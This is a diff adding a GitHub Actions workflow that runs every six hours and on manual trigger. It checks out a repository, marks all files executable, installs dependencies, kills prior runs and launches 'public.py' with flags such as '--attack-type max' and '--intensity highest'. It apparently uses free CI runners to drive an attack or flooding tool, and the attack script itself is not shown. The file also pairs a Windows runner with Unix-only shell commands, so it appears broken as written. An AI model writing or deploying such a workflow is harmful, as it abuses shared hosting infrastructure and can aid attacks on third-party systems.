@@ -1,0 +1,41 @@
+name: MrinMoYxCB
+
+on:
+  workflow_dispatch:  # Allows manual trigger
+  schedule:
+    - cron: "0 */6 * * *"  # Runs every 6 hours
+
+jobs:
+  combined_job:
+    runs-on: Windows
+    steps:
+      # Step 1: Checkout the repository
+      - name: Check out the code
+        uses: actions/checkout@v3
+
+      # Step 2: Set executable permissions for all files
+      - name: Set executable permissions for all repository files
+        run: chmod +x *
+
+      # Step 3: Verify permissions (Debugging step)
+      - name: Verify permissions (Debug)
+        run: ls -l
+
+      # Step 4: Install dependencies (from requirements.txt if present)
+      - name: Install dependencies
+        run: |
+          if [ -f "requirements.txt" ]; then
+            pip install --upgrade pip
+            pip install -r requirements.txt
+          else
+            echo "No requirements.txt file found, skipping dependency installation."
+          fi
+
+      # Step 5: Stop any old running processes
+      - name: Stop any old running processes
+        run: |
+          ps aux | grep 'python3 public.py' | awk '{print $2}' | xargs -r kill || echo "No process to kill."
+
+      # Step 6: Run Python script with different configuration
+      - name: Run Python script with max performance settings
+        run: python3 public.py --attack-type max --power core_max --intensity highest
